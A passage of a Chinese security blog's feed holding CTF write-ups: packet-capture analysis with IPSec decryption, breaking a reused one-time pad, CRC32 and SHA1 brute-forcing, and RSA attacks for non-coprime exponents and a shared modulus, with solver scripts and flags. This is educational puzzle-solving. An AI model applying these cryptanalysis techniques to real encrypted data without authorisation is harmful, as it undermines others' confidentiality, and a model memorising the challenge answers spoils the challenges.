id="非常简单的流量分析"><a href="#非常简单的流量分析" class="headerlink" title="非常简单的流量分析"></a>非常简单的流量分析</h3><p>下载附件，打开流量包过滤<code>http</code><br>发现robots.txt，进一步分析发现robots.txt中存在abc.html<br><img src="/images/2019-02-24-10-40-18.png" alt=""><br>继续分析abc.html<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;abc.html&quot;</span><br></pre></td></tr></table></figure></p><p>得到md5字符串和两串DES<br><img src="/images/2019-02-24-10-41-08.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">md5 0x99a98e067af6b09e64f3740767096c96</span><br><span class="line"></span><br><span class="line">DES 0xb19b21e80c685bcb052988c11b987802d2f2808b2c2d8a0d(129-&gt;143)</span><br><span class="line"></span><br><span class="line">DES 0x684a0857b767672d52e161aa70f6bdd07c0264876559cb8b(143-&gt;129)</span><br></pre></td></tr></table></figure></p><p>继续往下分析<br><img src="/images/2019-02-24-10-55-26.png" alt=""><br><img src="/images/2019-02-24-11-09-05.png" alt=""><br>发现都是IPSec加密后的流量，尝试使用已知信息和wireshark还原解密<br><img src="/images/2019-02-24-11-49-33.png" alt=""><br>还原之后发现访问的http带有ascii码，解密前几个发现是flag<br><img src="/images/2019-02-24-11-49-15.png" alt=""><br>于是将38个asiic码提取出来，然后拼接<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">123</span>,<span class="number">50</span>,<span class="number">55</span>,<span class="number">98</span>,<span class="number">48</span>,<span class="number">51</span>,<span class="number">98</span>,<span class="number">55</span>,<span class="number">53</span>,<span class="number">56</span>,<span class="number">102</span>,<span class="number">50</span>,<span class="number">53</span>,<span class="number">53</span>,<span class="number">50</span>,<span class="number">55</span>,<span class="number">54</span>,<span class="number">101</span>,<span class="number">53</span>,<span class="number">97</span>,<span class="number">57</span>,<span class="number">56</span>,<span class="number">100</span>,<span class="number">97</span>,<span class="number">48</span>,<span class="number">101</span>,<span class="number">49</span>,<span class="number">57</span>,<span class="number">52</span>,<span class="number">55</span>,<span class="number">98</span>,<span class="number">101</span>,<span class="number">100</span>,<span class="number">125</span>]</span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">res +=chr(i)</span><br><span class="line"><span class="keyword">print</span> res</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-02-24-11-53-05.png" alt=""></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="密码本"><a href="#密码本" class="headerlink" title="密码本"></a>密码本</h3><p>拿到题目信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">这个密码本本该只使用一次的，但是却使用了多次，导致密文易被破解</span><br><span class="line">经过一番尝试发现，秘钥的首字母很可能是y，剩下的就靠你了</span><br><span class="line"></span><br><span class="line">cip1: rlojsfklecby</span><br><span class="line">cip2: ulakqfgfsjlu</span><br><span class="line">cip3: dpaxwxtjgtay</span><br></pre></td></tr></table></figure></p><p>寻找首字母为y的单词，尝试一下year<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">key = &apos;year&apos;</span><br><span class="line">c1 = &apos;rlojsfklecby&apos;</span><br><span class="line">c2 = &apos;ulakqfgfsjlu&apos;</span><br><span class="line">c3 = &apos;dpaxwxtjgtay&apos;</span><br><span class="line">res1 = &apos;&apos;</span><br><span class="line">res2 = &apos;&apos;</span><br><span class="line">res3 = &apos;&apos;</span><br><span class="line">for i in range(len(key)):</span><br><span class="line">res1+=chr((((ord(c1[i])-ord(&apos;a&apos;))-(ord(key[i])-ord(&apos;a&apos;)))%26)+ord(&apos;a&apos;))</span><br><span class="line">res2+=chr((((ord(c2[i])-ord(&apos;a&apos;))-(ord(key[i])-ord(&apos;a&apos;)))%26)+ord(&apos;a&apos;))</span><br><span class="line">res3+=chr((((ord(c3[i])-ord(&apos;a&apos;))-(ord(key[i])-ord(&apos;a&apos;)))%26)+ord(&apos;a&apos;))</span><br><span class="line">print res1</span><br><span class="line">print res2</span><br><span class="line">print res3</span><br></pre></td></tr></table></figure></p><p>得到结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">thos</span><br><span class="line">what</span><br><span class="line">flag</span><br></pre></td></tr></table></figure></p><p>看到thos，猜测下一个是e，即those，测试了一下，发现key此时为<code>yearo</code><br>得到结果为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">those</span><br><span class="line">whatc</span><br><span class="line">flagi</span><br></pre></td></tr></table></figure></p><p>估摸着下一个应该是s，毕竟<code>flagis</code>，继续探测出，此时为<code>yearof</code>，得到结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">thosea</span><br><span class="line">whatca</span><br><span class="line">flagis</span><br></pre></td></tr></table></figure></p><p>此时没有了头绪，去词典搜一下<br><img src="/images/2019-02-24-19-49-18.png" alt=""><br>尝试了一下，发现key到<code>yearofthe</code>为止是有意义的，结果为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">thosearea</span><br><span class="line">whatcanyo</span><br><span class="line">flagisacc</span><br></pre></td></tr></table></figure></p><p>看第二个明文，猜测下一个是u，因为what can you，测试得到key为<code>yearofthep</code>，明文为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">thosearean</span><br><span class="line">whatcanyou</span><br><span class="line">flagisacce</span><br></pre></td></tr></table></figure></p><p>猜测第3个明文是flagisaccess，此时key为<code>yearofthepig</code>，解出明文<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">thoseareants</span><br><span class="line">whatcanyoudo</span><br><span class="line">flagisaccess</span><br></pre></td></tr></table></figure></p><p>我真是服了这个出题人了………………</p><h3 id="hahaha"><a href="#hahaha" class="headerlink" title="hahaha"></a>hahaha</h3><p>拿到题目发现是CRC32爆破，使用工具进行如下破解<br><img src="/images/2019-02-24-10-12-58.png" alt=""><br><img src="/images/2019-02-24-10-13-15.png" alt=""><br><img src="/images/2019-02-24-10-13-28.png" alt=""><br><img src="/images/2019-02-24-10-13-40.png" alt=""><br>得到压缩包密码为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tanny_is_very_beautifu1_</span><br></pre></td></tr></table></figure></p><p>解密后拿到flag.pdf，得到如下信息<br><img src="/images/2019-02-24-10-14-02.png" alt=""><br>需要我们进行排列组合，得到结果的Sha1为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e6079c5ce56e781a50f4bf853cdb5302e0d8f054</span><br></pre></td></tr></table></figure></p><p>排列组合大致如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1!</span><br><span class="line">2@</span><br><span class="line">&#123;[</span><br><span class="line">&#125;]</span><br><span class="line">asefcghnl</span><br></pre></td></tr></table></figure></p><p>直接刚可能性太多，这里我们知道应该是flag{}样式，所以缩小范围为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1!</span><br><span class="line">2@</span><br><span class="line">sechn</span><br></pre></td></tr></table></figure></p><p>编写如下脚本<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sha1</span><span class="params">(str)</span>:</span></span><br><span class="line">    sha = hashlib.sha1(str)</span><br><span class="line">    encrypts = sha.hexdigest()</span><br><span class="line">    <span class="keyword">return</span> encrypts</span><br><span class="line">a1 = <span class="string">'1!'</span></span><br><span class="line">a2 = <span class="string">'2@'</span></span><br><span class="line">a3 = <span class="string">'&#123;'</span></span><br><span class="line">a4 = <span class="string">'&#125;'</span></span><br><span class="line"><span class="keyword">for</span> str1 <span class="keyword">in</span> itertools.combinations(a1,<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> str2 <span class="keyword">in</span> itertools.combinations(a2,<span class="number">1</span>):</span><br><span class="line">        str3 = str1[<span class="number">0</span>]+str2[<span class="number">0</span>]+<span class="string">'sechn'</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> itertools.permutations(str3):</span><br><span class="line">            tmp = (<span class="string">''</span>.join(i))</span><br><span class="line">            res = <span class="string">'flag&#123;'</span>+tmp+<span class="string">'&#125;'</span></span><br><span class="line">            <span class="comment"># print sha1(res)</span></span><br><span class="line">            <span class="keyword">if</span> sha1(res) == <span class="string">'e6079c5ce56e781a50f4bf853cdb5302e0d8f054'</span>:</span><br><span class="line">                <span class="keyword">print</span> res</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p><p>运行后得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;sh@1enc&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于安全客 https://www.anquanke.com/post/id/171543</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;周末叕刷了安恒月赛，以下是Web&amp;amp;Crypto&amp;amp;Misc题解记录&lt;/p&gt;
&lt;h2 id=&quot;Web&quot;&gt;&lt;a href=&quot;#We
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2019-Hgame-Week4-Crypto&amp;MixedRSA_Easy</title>
    <link href="http://skysec.top/2019/02/22/2019-Hgame-Week4-Crypto-MixedRSA-Easy/"/>
    <id>http://skysec.top/2019/02/22/2019-Hgame-Week4-Crypto-MixedRSA-Easy/</id>
    <published>2019-02-22T02:30:02.000Z</published>
    <updated>2019-02-22T02:30:31.460Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/2019-02-22-10-30-28.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;/images/2019-02-22-10-30-28.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;

      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>浅谈RSA公钥非素数问题</title>
    <link href="http://skysec.top/2019/02/21/%E6%B5%85%E8%B0%88RSA%E5%85%AC%E9%92%A5%E9%9D%9E%E7%B4%A0%E6%95%B0%E9%97%AE%E9%A2%98/"/>
    <id>http://skysec.top/2019/02/21/浅谈RSA公钥非素数问题/</id>
    <published>2019-02-21T06:07:48.000Z</published>
    <updated>2019-02-21T06:41:42.604Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近刷题，遇到2道公钥不互素的题目，这里简单记录一下解决方案，主要还是灵活掌握公式推导。</p><h2 id="例题1"><a href="#例题1" class="headerlink" title="例题1"></a>例题1</h2><p>题干如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">e = 12</span><br><span class="line">p = 58380004430307803367806996460773123603790305789098384488952056206615768274527</span><br><span class="line">q = 81859526975720060649380098193671612801200505029127076539457680155487669622867</span><br><span class="line">ciphertext = 206087215323690202467878926681944491769659156726458690815919286163630886447291570510196171585626143608988384615185921752409380788006476576337410136447460</span><br><span class="line"></span><br><span class="line">算出的m转化成字符串</span><br></pre></td></tr></table></figure></p><p>我们知道RSA的概述公式如下</p><script type="math/tex; mode=display">c \equiv m^{e} \text{ } mod \text{ } n \\m \equiv c^{d} \text{ } mod \text{ } n \\\phi (n) = (p-1)*(q-1) \\d*e \equiv 1 \text{ } mod \text{ } \phi (n)</script><p>我们现在既然已知p,q，根据公式</p><script type="math/tex; mode=display">d*e \equiv 1 \text{ } mod \text{ } \phi (n)</script><p>我们可以得到</p><script type="math/tex; mode=display">d  \equiv e^{-1} \text{ } mod \text{ } \phi (n)</script><p>那么求e对于phi_n的逆元即可，我们可以使用<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libnum.invmod(e,phi_n)</span><br></pre></td></tr></table></figure></p><p>那么问题来了，我们运行后却得到报错<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ValueError: no invmod for given @a and @n</span><br></pre></td></tr></table></figure></p><p>这是为什么呢？我们测试一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print libnum.gcd(e,phi_n)</span><br></pre></td></tr></table></figure></p><p>发现结果为4，那么原因很明显，因为公钥和phi_n不互素<br>这里我们可以将公钥进行拆分<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e = 12 = 3*4</span><br></pre></td></tr></table></figure></p><p>我们可以知道</p><script type="math/tex; mode=display">d*3*4 \equiv 1 \text{ } mod \text{ } \phi (n)</script><p>既然phi_n与3<em>4不互素，我们可以灵活的将4</em>d看成一个整体，得到</p><script type="math/tex; mode=display">d*4 \equiv 3^{-1} \text{ } mod \text{ } \phi (n)</script><p>这样一来，我们可以求出4d，因为gcd(3,phi_n)=1<br>那么既然是4d，怎么解密呢？<br>我们知道</p><script type="math/tex; mode=display">m \equiv c^{d} \text{ } mod \text{ } n \\d*4 \equiv 3^{-1} \text{ } mod \text{ } \phi (n)</script><p>我们不妨将式1两边同时4次方，为验证两边依旧相等，我们做如下证明：<br>首先将同余式换成等式</p><script type="math/tex; mode=display">m = k*n + c^{d}</script><p>同时4次方</p><script type="math/tex; mode=display">m^4 = (k*n+c^d)^4</script><p>我们知道右边多项式展开后，除了最后一项为<code>c^4d</code>以外，其余每项必然带着n<br>我们等式两边同时取余n，得到</p><script type="math/tex; mode=display">m^4 \equiv c^{4d} \text{ } mod \text{ } n \\</script><p>这样一来我们可以构造出4d的解密形式，我们不妨进行计算<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">e = <span class="number">12</span></span><br><span class="line">p = <span class="number">58380004430307803367806996460773123603790305789098384488952056206615768274527</span></span><br><span class="line">q = <span class="number">81859526975720060649380098193671612801200505029127076539457680155487669622867</span></span><br><span class="line">n=p*q</span><br><span class="line">c = <span class="number">206087215323690202467878926681944491769659156726458690815919286163630886447291570510196171585626143608988384615185921752409380788006476576337410136447460</span></span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d4 = libnum.invmod(<span class="number">3</span>,phi)</span><br><span class="line">m4 = pow(c,d4,n)</span><br><span class="line"><span class="keyword">print</span> m4</span><br></pre></td></tr></table></figure></p><p>得到m^4为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">20106844800109502536288854016069119595196463634259079507316147175432925273818188038332257297004492492765022431372230373366290144995921</span><br></pre></td></tr></table></figure></p><p>于是我们可以得到式子（结果太大，这里我做一个简略）</p><script type="math/tex; mode=display">m^4 \equiv 2010684... mod \text{ } n</script><p>将同余式转换成等式得到</p><script type="math/tex; mode=display">m^4 = k*n + 2010684...</script><p>这里我们可以选择对k进行爆破，找到一个刚好可以开4次方的k，此时开4次方后结果即为m<br>我们直接测试一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">m = gmpy.root(m4,4)</span><br><span class="line">print m</span><br></pre></td></tr></table></figure></p><p>发现结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(mpz(2117561251816846604440536517998717L), 1)</span><br></pre></td></tr></table></figure></p><p>发现刚好可以开4次方，于是可以得到结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2117561251816846604440536517998717</span><br></pre></td></tr></table></figure></p><p>我们转成string得到flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;xxxxxxx&#125;</span><br></pre></td></tr></table></figure></p><h2 id="例题2"><a href="#例题2" class="headerlink" title="例题2"></a>例题2</h2><p>题干如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">e1:0x33240</span><br><span class="line"></span><br><span class="line">e2:0x3e4f</span><br><span class="line"></span><br><span class="line">n:0x9439682bf1b4ab48c43c524778c579cc844b60872275725c1dc893b5bcb358b9f136e4dab2a06318bb0c80e202a14bc54ea334519bec023934e01e9378abf329893f3870979e9f2f2be8fff4df931216a77007a2509f49f697bf286285e97fac5dc6e4a164b5c2cc430887b18136437ba67777bda05aafdeaf918221c812b4c7d1665238f84ab0fab7a77fcae92a0596e58343be7a8e6e75a5017c63a67eb11964970659cd6110e9ec6502288e9e443d86229ef2364dfecb63e2d90993a75356854eb874797340eece1b19974e86bee07019610467d44ec595e04af02b574a97fa98bdb2e779871c804219cab715f4a80fef7f8fb52251d86077560b39c1c2a1</span><br><span class="line"></span><br><span class="line">c1:0x7c7f315a3ebbe305c1ad8bd2f73b1bb8e300912b6b8ba1b331ac2419d3da5a9a605fd62915c11f8921c450525d2efda7d48f1e503041498f4f0676760b43c770ff2968bd942c7ef95e401dd7facbd4e5404a0ed3ad96ae505f87c4e12439a2da636f047d84b1256c0e363f63373732cbaf24bda22d931d001dcca124f5a19f9e28608ebd90161e728b782eb67deeba4cc81b6df4e7ee29a156f51a0e5148618c6e81c31a91036c982debd1897e6f3c1e5e248789c933a4bf30d0721a18ab8708d827858b77c1a020764550a7fe2ebd48b6848d9c4d211fd853b7a02a859fa0c72160675d832c94e0e43355363a2166b3d41b8137100c18841e34ff52786867d</span><br><span class="line"></span><br><span class="line">c2:0xf3a8b9b739196ba270c8896bd3806e9907fca2592d28385ef24afadc2a408b7942214dad5b9e14808ab988fb15fbd93e725edcc0509ab0dd1656557019ae93c38031d2a7c84895ee3da1150eda04cd2815ee3debaa7c2651b62639f785f6cabf83f93bf3cce7778ab369631ea6145438c3cd4d93d6f2759be3cc187651a33b3cc4c3b477604477143c32dfff62461fdfd9f8aa879257489bbf977417ce0fbe89e3f2464475624aafef57dd9ea60339793c69b53ca71d745d626f45e6a7beb9fcbd9d1a259433d36139345b7bb4f392e78f1b5be0d2c56ad50767ee851fac670946356b3c05d0605bf243b89c7e683cc75030b71633632fb95c84075201352d6</span><br><span class="line"></span><br><span class="line">c1=pow(m, e1, n)</span><br><span class="line">c2=pow(m, e2, n)</span><br></pre></td></tr></table></figure></p><p>我们有条件</p><script type="math/tex; mode=display">C_1 \equiv  M^{e_1}  \text{ } mod \text{ } n \\ C_2 \equiv  M^{e_2} \text{ } mod \text{ } n \\</script><p>本应利用</p><script type="math/tex; mode=display">gcd(e_1,e_2)=1 \\s_1e_1+s_2e_2 = 1</script><p>但这里e_1和e_2不互素，所以我们有<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> libnum.gcd(e1,e2)</span><br></pre></td></tr></table></figure></p><p>得到结果为3，所以得到如下等式</p><script type="math/tex; mode=display">gcd(e_1,e_2)=3 \\s_1e_1+s_2e_2 = 3</script><p>我们可以将之前同余式化为如下形式</p><script type="math/tex; mode=display">C_1 = k_1n+M^{e_1} \\C_2 = k_2n+M^{e_2} \\</script><p>然后式子1两边同时进行s1次方，式子2进行s2次方，得到</p><script type="math/tex; mode=display">C_1^{s_1} = (k_1n+M^{e_1})^{s_1} \\C_2^{s_2} = (k_2n+M^{e_2})^{s_2} \\</script><p>右边的高次展开式中，除了最后一项</p><script type="math/tex; mode=display">M^{e_1s_1} \\M^{e_2s_2}</script><p>一定每一项都含有n，所以同时取余n的时候，只剩下最后一项</p><script type="math/tex; mode=display">C_1^{s_1} \equiv  M^{e_1s_1}  \text{ } mod \text{ } n \\ C_2^{s_2} \equiv  M^{e_2s_2} \text{ } mod \text{ } n \\</script><p>上下两式相乘，即可得到</p><script type="math/tex; mode=display">C_1^{s_1}C_2^{s_2} \equiv  M^{e_1s_1+e_2s_2} \text{ } mod \text{ } n \\</script><p>又因为</p><script type="math/tex; mode=display">s_1e_1+s_2e_2 = 3</script><p>所以可以得到</p><script type="math/tex; mode=display">C_1^{s_1}C_2^{s_2} \equiv  M^3 \text{ } mod \text{ } n \\</script><p>那么依旧回到之前的问题，我们有</p><script type="math/tex; mode=display">k*n + C_1^{s_1}C_2^{s_2} = M^3</script><p>那么依旧是之前的操作，我们可以遍历k，找到刚好开3次方的k，此时开3次方即为M<br>这里也是比较简单，k=0的时候就成立了，无需遍历，脚本如下<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">s1, s2, tmp = libnum.xgcd(e1, e2)</span><br><span class="line"><span class="keyword">if</span> s1 &lt; <span class="number">0</span>:</span><br><span class="line">    s1 = - s1</span><br><span class="line">    c1 = gmpy2.invert(c1, n)</span><br><span class="line"><span class="keyword">elif</span> s2 &lt; <span class="number">0</span>:</span><br><span class="line">    s2 = - s2</span><br><span class="line">    c2 = gmpy2.invert(c2, n)</span><br><span class="line">m = pow(c1, s1, n) * pow(c2, s2, n) % n</span><br><span class="line">m = <span class="number">211655262573966881062823795220179644607412162371069</span></span><br><span class="line"><span class="keyword">print</span> gmpy.root(m,<span class="number">3</span>)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>写这篇文章不仅限于分享，只要能熟练推导RSA基础公式，不硬套脚本，一些RSA的变题基本都是可以解决的XD</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近刷题，遇到2道公钥不互素的题目，这里简单记录一下解决方案，主要还是灵活掌握公式推导。&lt;/p&gt;
&lt;h2 id=&quot;例题1&quot;&gt;&lt;a href=
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
</feed>
